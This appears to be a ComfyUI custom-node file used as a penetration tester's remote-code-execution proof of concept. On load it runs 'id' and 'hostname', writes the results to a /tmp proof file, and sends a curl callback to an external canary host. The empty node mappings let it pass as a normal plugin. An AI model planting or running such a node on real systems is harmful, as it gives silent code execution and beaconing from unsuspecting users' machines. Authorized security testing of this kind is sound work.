import os
import subprocess

# --- Praetorian Security Assessment - RCE POC ---
# This node demonstrates code execution on the ComfyUI workstation.
# Authorized security testing only.

try:
    # 1. Write id output to a proof file
    id_output = subprocess.check_output(["id"], text=True).strip()
    hostname = subprocess.check_output(["hostname"], text=True).strip()
    proof = f"hostname: {hostname}\nid: {id_output}\npwd: {os.getcwd()}\n"
    
    with open("/tmp/praetorian-rce-poc.txt", "w") as f:
        f.write(proof)
    
    print(f"[POC] RCE proof written to /tmp/praetorian-rce-poc.txt")
    print(f"[POC] {id_output}")
    
    # 2. Curl interact.sh canary for external callback evidence
    subprocess.Popen(
        ["curl", "-s", "https://piwsu9gkbowtdmee.ixx.sh"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print("[POC] Canary callback sent to piwsu9gkbowtdmee.ixx.sh")
    
except Exception as e:
    print(f"[POC] Error: {e}")

# Empty node mappings so ComfyUI doesn't error
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
